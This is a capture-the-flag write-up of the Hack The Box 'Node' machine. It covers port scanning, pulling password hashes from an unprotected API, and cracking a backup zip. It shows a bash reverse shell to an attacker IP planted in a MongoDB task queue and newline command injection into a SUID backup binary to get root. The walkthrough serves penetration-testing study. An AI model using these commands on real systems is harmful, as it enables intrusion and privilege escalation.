---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/course-review/cyber-security-courses-journey/oscp-journey/ctf/hack-the-box/linux-boxes/node-medium
---

# ✅ Node (Medium)

## Lesson Learn

![](../../../../../../.gitbook/assets/Node.PNG)

## Report-Penetration

**Vulnerable Exploit:** Unrestricted access to sensitive information and Weak password policy

**System Vulnerable:** 10.10.10.58

**Vulnerability Explanation:** Fuzzing the hidden files and directories which exposed the URL path to API contained list of users and password hashes. Due to weak password set that could allow to crack and gain access to backup file that stored user credential.

**Privilege Escalation Vulnerability:** Misconfigure group permission on backup&#x20;

**Vulnerability Fix:** Restricted access to sensitive Path and implement strong password policy&#x20;

**Severity:** High

**Step to Compromise the Host:**&#x20;

## Reconnaissance

Start with scanning all TCP port.

```
└─$ sudo nmap -p- --min-rate 10000 10.10.10.58 > nmap.txt
└─$ cat nmap.txt                                      
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 03:35 EST
Nmap scan report for 10.10.10.58
Host is up (0.077s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

Filter out all unnecessary character and just grep only open port.

```
└─$ cat nmap.txt | grep open | awk -F / '{print $1}' | sed -z "s/\n/,/g" | head -c-1
22,3000 
```

```
└─$ nmap -sC -sV -T4 -p22,3000 10.10.10.58 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 03:36 EST
Nmap scan report for 10.10.10.58
Host is up (0.043s latency).

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
└─$ nmap -sV -p22,3000 10.10.10.58 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 03:49 EST
Nmap scan report for 10.10.10.58
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

### Port 3000 Apache Hadoop

First I will check on webpage. By going through port 3000, it displays a webpage of myplace.

![](<../../../../../../.gitbook/assets/image (684).png>)

By clicking on each user profiles, it doesn't return anything interest. There is a login option. By viewing the source code also no comment need to notice.

![](<../../../../../../.gitbook/assets/image (598).png>)

By running discovery hidden directory we didn't find any interest.

```
└─$ feroxbuster -u http://10.10.10.58:3000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.58:3000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
WLD       90l      249w     3861c Got 200 for http://10.10.10.58:3000/d07d3890615d4d00933a2596c31d7303 (url length: 32)
WLD         -         -         - Wildcard response is static; auto-filtering 3861 responses; toggle this behavior by using --dont-filter
WLD       90l      249w     3861c Got 200 for http://10.10.10.58:3000/93894b020e0c44c2a7cd77c55c739cd867505ed2d2404e2ba22ff83a53713f4722d6d1ff049a4300ab75280dbd59ed0f (url length: 96)
301        9l       15w      173c http://10.10.10.58:3000/uploads
301        9l       15w      171c http://10.10.10.58:3000/assets
301        9l       15w      177c http://10.10.10.58:3000/assets/js
301        9l       15w      179c http://10.10.10.58:3000/assets/css
301        9l       15w      187c http://10.10.10.58:3000/assets/js/misc
301        9l       15w      185c http://10.10.10.58:3000/assets/js/app
301        9l       15w      209c http://10.10.10.58:3000/assets/js/app/controllers
301        9l       15w      171c http://10.10.10.58:3000/vendor
301        9l       15w      185c http://10.10.10.58:3000/vendor/jquery
301        9l       15w      175c http://10.10.10.58:3000/partials
[####################] - 8m    299990/299990  0s      found:12      errors:1396   
[####################] - 7m     30001/29999   65/s    http://10.10.10.58:3000
[####################] - 7m     29999/29999   65/s    http://10.10.10.58:3000/uploads
[####################] - 7m     29999/29999   65/s    http://10.10.10.58:3000/assets
[####################] - 7m     29999/29999   65/s    http://10.10.10.58:3000/assets/js
[####################] - 7m     29999/29999   65/s    http://10.10.10.58:3000/assets/css
[####################] - 7m     29999/29999   65/s    http://10.10.10.58:3000/assets/js/misc
[####################] - 7m     29999/29999   65/s    http://10.10.10.58:3000/assets/js/app
[####################] - 7m     29999/29999   66/s    http://10.10.10.58:3000/vendor
[####################] - 7m     29999/29999   67/s    http://10.10.10.58:3000/vendor/jquery
[####################] - 6m     29999/29999   79/s    http://10.10.10.58:3000/partials
```

Let can back to the webpage and press `Ctrl+Shift+C` > Debugger. We can see there are some custom scripts.&#x20;

![](<../../../../../../.gitbook/assets/image (476).png>)

Going through `admin.js` and `/api/admin/backup`, it returns **authenticated False**.

![](<../../../../../../.gitbook/assets/image (287).png>)

![](<../../../../../../.gitbook/assets/image (737).png>)

Going through `home.js` and `/api/users/latest`, we found there are 3 username and hash passwords and not admin account.

![](<../../../../../../.gitbook/assets/image (314).png>)

![](<../../../../../../.gitbook/assets/image (254).png>)

Again going through `profiles.js`, we found the code **/api/users + $routeParams.username.**

![](<../../../../../../.gitbook/assets/image (464).png>)

By following through /api/users, we found there are 4 users and 1 of them is admin.

![](<../../../../../../.gitbook/assets/image (276).png>)

Let grep all the hashes and try to crack them if they are using weak password. Go to crackstation and paste all the hashes in. Immediately, we found there 3 hashes were cracked.

```
└─$ curl -s 10.10.10.58:3000/api/users | jq -r '.[].password'                      
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
```

![](<../../../../../../.gitbook/assets/image (305).png>)

Login with user and password on the webpage, it works. Once, we are in, it allows us to download Backup files. Let download and check if there is any interesting.

![](<../../../../../../.gitbook/assets/image (362).png>)

Checking the file type and it contained ASCII text with very long lines.

```
└─$ file myplace.backup 
myplace.backup: ASCII text, with very long lines, with no line terminatorsm

└─$ wc -l myplace.backup            
0 myplace.backup

└─$ wc -m myplace.backup
3459880 myplace.backup
```

Checking the content on files and seem like it's base64 encoded.

```
└─$ head -c100 myplace.backup
UEsDBAoAAAAAAHtvI0sAAAAAAAAAAAAAAAAQABwAdmFyL3d3dy9teXBsYWNlL1VUCQADyfyrWfegh2F1eAsAAQQAAAAABAAAAABQ 

└─$ cat myplace.backup | od -cvAnone -w1 | sort -bu | tr -d '\n' | tr -d ' '
+/=0123456789aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ 
```

Again check the file type is ZIP. Listing the file content in the zip folder.

```
└─$ file myplace.back.decode                                                                                                                                            2 ⨯
myplace.back.decode: Zip archive data, at least v1.0 to extract

└─$ unzip -l myplace.back.decode
Archive:  myplace.back.decode
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2017-09-03 08:59   var/www/myplace/
    21264  2017-09-01 19:10   var/www/myplace/package-lock.json
        0  2017-09-01 19:10   var/www/myplace/node_modules/
        0  2017-09-01 19:10   var/www/myplace/node_modules/serve-static/
     7508  2017-02-24 21:17   var/www/myplace/node_modules/serve-static/README.md
     4533  2017-02-25 18:11   var/www/myplace/node_modules/serve-static/index.js
     1189  2017-02-24 21:01   var/www/myplace/node_modules/serve-static/LICENSE
     8504  2017-08-06 01:45   var/www/myplace/node_modules/serve-static/HISTORY.md
     2175  2017-09-01 19:10   var/www/myplace/node_modules/serve-static/package.json
```

Let try to unzip the file but it requires the password which we don't know.

```
└─$ unzip myplace.back.decode
Archive:  myplace.back.decode
[myplace.back.decode] var/www/myplace/package-lock.json password: 
```

### Cracking ZipFile With John

We can use zip2john to grab the hash of the zip file.

```
└─$ /usr/sbin/zip2john myplace.back.decode 2>/dev/null | tee myplace.zip.hash
myplace.back.decode:$pkzip2$3*2*1*0*8*24*9c88*1223*9e0e24bcc2498c98f24ce04142016c67617a0e963abdd7c381c13918adee52822712e61d*1*0*8*24*37ef*0145*fe81ba228776f05e1139e2e1a9fea6354c87a73c7b519e1103b4b62713affef089e5b3a1*2*0*11*5*118f1dfc*94cb*67*0*11*118f*3d0f*6902f97145238389acd785b62b0077ce1e*$/pkzip2$::myplace.back.decode:var/www/myplace/node_modules/qs/.eslintignore, var/www/myplace/node_modules/serve-static/README.md, var/www/myplace/package-lock.json:myplace.back.decode
    - 2>/dev/null (Don't display error message)
    - tee (copy standard input to the file myplace.zip.hash)
```

```
└─$ sudo john myplace.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt               
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])

└─$ sudo john myplace.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=PKZIP
[sudo] password for pwned: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (myplace.back.decode)
1g 0:00:00:00 DONE (2021-11-07 05:14) 5.882g/s 1084Kp/s 1084Kc/s 1084KC/s sandrea..joan08
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Cracking ZipFile with Fcrack

```
└─$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.back.decode
possible pw found: magicword ()
   
    -D (Dictionary attack)
    -p (Password File)
```

Now we can Unzip the file. Enumerating on the file we extract, we found credentials on **app.js**.

```
└─$ cat app.js  

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```

## Exploitation

### Shell as Mark

We are now can ssh to the machine with credentials of user mark.

```
└─$ ssh mark@10.10.10.58                                                     
mark@10.10.10.58's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ 
```

We are now on the machine but there is no flag of user mark. Enumerating on the machine, we found 3 users that allow /bin/bash.

```
mark@node:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
tom:x:1000:1000:tom,,,:/home/tom:/bin/bash
mark:x:1001:1001:Mark,,,:/home/mark:/bin/bash
```

Find user flag and we found it under user tom. By this, we will escalate to user tom or root.&#x20;

```
mark@node:~$ locate user.txt
/home/tom/user.txt
mark@node:~$ ls -l /home/tom/user.txt
-rw-r----- 1 root tom 33 Sep  3  2017 /home/tom/user.txt
```

### Shell as Tom

Let check the service port running on the machine and process that user Tom's running.

```
mark@node:/tmp$ netstat -tupln                                                                                                                                                                
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::3000                 :::*                    LISTEN      -               
mark@node:/tmp$ ps aux | grep tom
tom       1223  0.1  5.3 1019880 40400 ?       Ssl  15:05   0:00 /usr/bin/node /var/www/myplace/app.js
tom       1228  0.0  5.9 1007544 45020 ?       Ssl  15:05   0:00 /usr/bin/node /var/scheduler/app.js
```

### Auto script JS

We can see service port 27017 listening on locally. Let check the content of both the files /var/www/myplace/app.js and /var/scheduler/app.js.

On /var/www/myplace/app.js we already check the content but /var/scheduler/app.js didn't.

```
mark@node:/tmp$ cat /var/scheduler/app.js
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

The script will connect to mongo database. The function doc will run doc.cmd and delete the doc.

Let connect to mongo database with username and password.

```
mark@node:/tmp$ mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler
MongoDB shell version: 3.2.16
connecting to: localhost:27017/scheduler
> db # show all the tables in databases
scheduler 
> show collections # show collections in current database
tasks
> db.tasks.find() # list objects in collection tasks but there is no objects
```

Let now add reverse shell into object of tasks.

```
> db.tasks.insert({cmd: "bash -c 'bash -i >& /dev/tcp/10.10.14.31/5555 0>&1'"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find()
{ "_id" : ObjectId("6187f1e22700092779a3579b"), "cmd" : "bash -c 'bash -i >& /dev/tcp/10.10.14.31/5555 0>&1'" }
```

Start our netcat listener on port 5555 and wait for sometimes the shell pop up.

```
└─$ nc -lvp 5555                    
listening on [any] 5555 ...
10.10.10.58: inverse host lookup failed: Unknown host
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.58] 37476
bash: cannot set terminal process group (1228): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@node:/$ id
id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
tom@node:/$ whoami
whoami
tom
```

As we can see the user Tom is a groups of admin.

## Privilege Escalation

Let check if there is misconfiguration of file permission.

```
tom@node:/$ find / -type f -perm -4000 -ls 2>/dev/null   
   259267     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   297906     80 -rwsr-xr-x   1 root     root        81672 Jul 17  2017 /usr/lib/snapd/snap-confine
   278211     44 -rwsr-xr--   1 root     messagebus    42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   278959     40 -rwsr-xr-x   1 root     root          38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    17884    420 -rwsr-xr-x   1 root     root         428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
   282088     16 -rwsr-xr-x   1 root     root          14864 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1
   303364     20 -rwsr-xr--   1 root     admin         16484 Sep  3  2017 /usr/local/bin/backup
   258944     52 -rwsr-xr-x   1 root     root          49584 May 17  2017 /usr/bin/chfn
   281144     52 -rwsr-sr-x   1 daemon   daemon        51464 Jan 14  2016 /usr/bin/at
   259007     76 -rwsr-xr-x   1 root     root          75304 May 17  2017 /usr/bin/gpasswd
   279006     36 -rwsr-xr-x   1 root     root          32944 May 17  2017 /usr/bin/newgidmap
   258946     40 -rwsr-xr-x   1 root     root          40432 May 17  2017 /usr/bin/chsh
   259166    136 -rwsr-xr-x   1 root     root         136808 Jul  4  2017 /usr/bin/sudo
   282096     24 -rwsr-xr-x   1 root     root          23376 Jan 17  2016 /usr/bin/pkexec
   259071     40 -rwsr-xr-x   1 root     root          39904 May 17  2017 /usr/bin/newgrp
   259082     56 -rwsr-xr-x   1 root     root          54256 May 17  2017 /usr/bin/passwd
   279005     36 -rwsr-xr-x   1 root     root          32944 May 17  2017 /usr/bin/newuidmap
   258636     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
   258671     28 -rwsr-xr-x   1 root     root          27608 Jun 14  2017 /bin/umount
   278644     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
   258637     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
   278666    140 -rwsr-xr-x   1 root     root         142032 Jan 28  2017 /bin/ntfs-3g
   258653     40 -rwsr-xr-x   1 root     root          40128 May 17  2017 /bin/su
   258622     40 -rwsr-xr-x   1 root     root          40152 Jun 14  2017 /bin/mount
```

We can see there is one file set SUID with admin group.

```
303364     20 -rwsr-xr--   1 root     admin         16484 Sep  3  2017 /usr/local/bin/backup
```

We should get back to the file app.js and found this path.

```
app.get('/api/admin/backup', function (req, res) {                                                                                                                                          
    if (req.session.user && req.session.user.is_admin) {                                                                                                                                      
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);                                                                                                              
      var backup = '';                                                                                                                                                                        
                                                                                                                                                                                              
      proc.on("exit", function(exitCode) {                                                                                                                                                    
        res.header("Content-Type", "text/plain");                                                                                                                                             
        res.header("Content-Disposition", "attachment; filename=myplace.backup");                                                                                                             
        res.send(backup);                                                                                                                                                                     
      });                                                                                                                                                                                     
                                                                                                                                                                                              
      proc.stdout.on("data", function(chunk) {                                                                                                                                                
        backup += chunk;                                                                                                                                                                      
      });                                                                                                                                                                                     
                                                                                                                                                                                              
      proc.stdout.on("end", function() {                                                                                                                                                      
      });
```

It looks like the script call out three arguments: **-q, backupkey, \_\_dirname**.

Let start execute the file with following parameter. Otherwise, we could read the file properly. From [Ippsec's Video](https://www.youtube.com/watch?v=sW10TlZF62w), /root is bad characters, once we decode base64, it will show troll face.

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root

[+] Finished! Encoded backup is below:                                                                                                                                                                                                                                                                                                                                                  
UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA== 
```

```
└─$ cat troll.txt| base64 -d > troll.zip

└─$ 7z e troll.zip

└─$ cat root.txt
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ
QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ
QQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ
QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ
QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ
QQQQQQQP'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ
QQQQQP'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP'    "??' =QQmWWV?46/ ?QQQQQ
QQQP'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ
QQ[ j@mQP'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ
QW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ
QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ
QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ
QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'<mWWWWWQW?^  ` ]6QQ' yQQQQQ
QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ
QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ
QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ
QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ
QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ
QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ
QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ
QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ

```

But if we extract the file just specify root, it will display the correct content of root flag.

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root
```

```
└─$ cat testing.txt | base64 -d > testing.zip

└─$ 7z e testing.zip
```

### Priv-Esc Technique

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "as
> /bin/bash                                                                                                                                                                 
> asd"                                                                                                                                                                      
        zip warning: name not matched: as                                                                                                                                   
                                                                                                                                                                            
zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_2015693318 . -i as)                                                                                        
To run a command as administrator (user "root"), use "sudo <command>".                                                                                                      
See "man sudo_root" for details.                                                                                                                                            
                                                                                                                                                                            
root@node:/# whoami                                                                                                                                                         
root                                                                                                                                                                        
root@node:/# id                                                                                                                                                             
uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)

```

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf 'abc\n/bin/bash\nabc')"
        zip warning: name not matched: aaa                                                                                                                                  
                                                                                                                                                                            
zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_497775969 . -i aaa)                                                                                        
To run a command as administrator (user "root"), use "sudo <command>".                                                                                                      
See "man sudo_root" for details.                                                                                                                                            
                                                                                                                                                   
root@node:/# whoami                                                                                                                                                         
root       
```
